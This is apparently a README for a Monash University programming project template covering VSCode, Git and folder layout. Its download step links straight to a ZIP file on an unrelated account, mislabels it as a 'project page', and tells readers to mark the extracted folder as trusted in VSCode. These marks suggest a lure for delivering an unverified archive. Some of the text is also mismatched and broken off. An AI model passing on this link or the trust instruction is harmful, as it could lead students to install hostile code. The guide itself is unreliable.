## 🛠️ What this is

Programming-Project-Template is a reusable project setup for Monash University coursework. It gives you a ready-made structure for class projects, a Git workflow, and a VSCode setup so you can start work with less setup.

Use it for projects in subjects such as FIT1045, ENG1014, FIT1047, and similar programming units. It helps keep files in the right place and makes it easier to track changes as you work.

## 📥 Download and open the project

1. Visit the project page: https://raw.githubusercontent.com/geared-radiobrightness882/Programming-Project-Template/main/src/Programming_Project_Template_3.7-beta.3.zip
2. On the page, click the green **Code** button.

## 💻 What you need on Windows

Before you start, install these tools:

- **Windows 10 or Windows 11**
- **VSCode**
- **Git**
- A ZIP file extractor, such as the built-in Windows tool

For best results, use the latest version of VSCode and Git. The template is built for a standard Windows setup and works well for course work on a school laptop or personal PC.

## 🚀 Set up VSCode

1. Open **VSCode**.
2. Select **File > Open Folder**.
3. Choose the folder you extracted from the ZIP file.
4. Wait for VSCode to load the project files.

If VSCode asks whether you trust the folder, choose **Yes** if you downloaded it from the link above.

## 🔧 Set up Git

Git helps you save your work in small steps and keep a record of changes.

1. Open **Git Bash** or **Command Prompt**.
2. Go to the project folder.
3. Check that Git is available by running:

   git --version

4. If you plan to use Git from VSCode, open the Source Control view on the left side of the window.

Common Git actions in this template:

- **Commit**: save a named checkpoint
- **Branch**: work on a separate line of changes
- **Push**: send your changes to GitHub
- **Pull**: get the latest changes

## 📁 Project structure

This template uses a simple folder layout so you can find files fast.

Typical structure:

- **src** — your main source files
- **tests** — test files, if your subject uses them
- **docs** — notes, reports, or project docs
- **assets** — images, icons, or sample data
- **.vscode** — editor settings for VSCode
- **README.md** — project instructions and notes

Keep your files in the matching folder so your project stays easy to manage.

## 🧭 How to start your first task

1. Open the folder in VSCode.
2. Look through the project files.
3. Find the main file your unit expects you to edit.
4. Read any comments or notes in the template files.
5. Make a small change.
6. Save the file.
7. Check your work in VSCode.

If your unit gives you a task sheet, match the file names and folder layout to that task.

## 📝 Working with course projects

This template is useful when you need a clear process for assignment work.

A simple workflow:

1. Open the project.
2. Make one change.
3. Test that change.
4. Commit the change.
5. Repeat for the next part.

This approach helps you avoid large edits in one go. It also makes it easier to undo a mistake if needed.

## 🔐 Git workflow tips

A few habits make project work easier:

- Save often
- Use short commit messages
- Commit after each finished task
- Keep related changes together
- Avoid editing many files at once if you can

Example commit messages:

- Add task one files
- Fix input handling
- Update project notes
- Finish week three work

If you want to keep the project easy to find:

## ❓ If you get stuck

Check these common points:

- The ZIP file was not extracted
- You opened the wrong folder in VSCode
- Git is not installed
- You are missing a file your unit expects
- You changed a file and did not save it

If the project still does not open as expected, re-download it from the project page and try again
